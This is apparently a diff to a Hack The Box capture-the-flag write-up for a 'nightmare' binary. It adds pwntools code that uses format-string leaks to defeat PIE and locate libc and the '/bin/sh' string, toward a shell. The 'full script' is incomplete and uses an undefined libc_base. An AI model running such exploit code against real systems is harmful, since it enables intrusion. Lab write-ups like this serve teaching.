@@ -170,7 +170,7 @@ sh.interactive()
 
 11. Now calculate the libc_base.
 
-> Grab at iter 26 (our previously potential libc address) and get the distance to the libc_base.
+> Grab at iter 26 (our previously potential libc address) and get the distance to the libc_system_base.
 
 ![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/3b3d3765-449a-42fa-af5d-7f81e7ebcfbc)
 
@@ -247,3 +247,95 @@ sh.interactive()
 
 ![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/7c1414bd-03a1-4ec3-9df5-805184317d42)
 
+> Calculate the libc_base
+
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/4596ca09-9ea8-4d62-9feb-18b51a3dddd7)
+
+
+```py
+libc_base = libc_system_binary - 0x4c330 
+log.info('This is the libc_base --> %#0x', libc_base)
+```
+
+12. Great! Since we have the libc_base now we can calculate the binsh address, simply using this formula:
+
+![image](https://github.com/Bread-Yolk/hackthebox/assets/70703371/deb346f4-3ad5-458e-a09f-2e58473c5c6f)
+
+
+> Formula
+
+```py
+binsh = libc_base + 0x196031
+log.info('This is the binsh strings address --> %#0x', binsh)
+```
+
+> FULL SCRIPT (so far..)
+
+```py
+from pwn import *
+import os 
+
+os.system('clear')
+
+def start(argv=[],  *a, **kw):
+    if args.REMOTE:
+        return remote(sys.argv[1], sys.argv[2],  *a, **kw)
+    elif args.GDB:
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe] + argv, *a, **kw)
+
+gdbscript ='''
+init-pwndbg
+piebase
+breakrva 0x138c
+continue
+'''.format(**locals())
+
+exe = './nightmare'
+elf = context.binary = ELF(exe, checksec=True)
+context.log_level = 'INFO'
+
+sh = start()
+
+'''
+for i in range(100):
+    try:
+        #sh = process()
+        sh.sendlineafter(b'>', b'1')
+        sh.recvuntil(b'>')
+        print("Iter {}:".format(i))
+        sh.sendline('%{}$p'.format(i))
+        sh.recvuntil(b'> ')
+        get = sh.recvlineS()
+        print(get)
+        #sh.close()
+    except EOFError:
+        pass
+'''
+
+sh.sendlineafter(b'>', b'1')
+sh.sendlineafter(b'>', '%23$p')
+sh.recvuntil(b'>')
+get_leak_pie = sh.recvlineS()
+leak = int(get_leak_pie, 16)
+log.success('Leaked pie --> %#0x', leak)
+
+pie_base = leak - 13792
+log.info('This is the actual pie_base --> %#0x', pie_base)
+
+sh.sendlineafter(b'>', b'1')
+sh.sendlineafter(b'>', '%26$p')
+sh.recvuntil(b'>')
+get_leak_libc_system = sh.recvlineS()
+leaked_libc_system = int(get_leak_libc_system, 16)
+log.success('Leaked libc system address --> %#0x', leaked_libc_system)
+
+libc_system_binary = leaked_libc_system - 1599312
+log.info('This is the calculated_libc_system --> %#0x', libc_system_binary)
+
+binsh = libc_base + 0x196031
+log.info('This is the binsh strings address --> %#0x', binsh)
+
+sh.interactive()
+```
